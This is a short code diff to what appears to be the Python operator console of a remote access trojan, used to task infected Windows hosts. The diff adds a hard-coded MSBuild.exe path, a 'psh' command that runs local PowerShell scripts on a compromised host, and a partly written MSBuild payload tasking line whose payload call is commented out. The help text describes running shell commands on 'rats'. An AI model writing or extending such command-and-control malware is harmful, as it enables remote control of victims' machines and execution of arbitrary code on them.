@@ -26,6 +26,7 @@ port = args.port
 ssl = args.ssl
 
 supported_types = ["c", "py", "js", "ps1", "hta"]
+msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe"
 
 # I should probably make a dict of dicts...
 commands = {}
@@ -84,7 +85,7 @@ def colors(value):
             return(BOLD + py + value + ENDC)
     except:
         if(len(value) > 100):
-            return(UNDERLINE + value[0:96] + c + "..." + ENDC)
+            return(UNDERLINE + value[0:96] + ENDC + "...")
         else:
             return(UNDERLINE + value + ENDC)
 
@@ -216,6 +217,7 @@ def get_help():
     print("quit/kill_rat -- when interacting with a rat, type quit or kill_rat to task the rat to shut down")
     print("spawn -- used to spawn a new rat in a new process.")
     print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on agent type")
+    print("psh <local_powershell_script_path> -- Runs the powershell script on the rat")
     print("-------------------------------------------------------------------------")
     print("")
     print("Extra things to know:")
@@ -299,7 +301,7 @@ if __name__ == "__main__":
                             if(types[ratID] == "ps1"):
                                 inp = "psh " + script
                             else:
-                                inp = "echo sending msbuild package"
+                                inp = "psh " + msbuild_path + " "# + send_msbuild_xml(filepath)
                         except:
                             print("[!] Could not open file " + filepath + " for reading")
                             continue
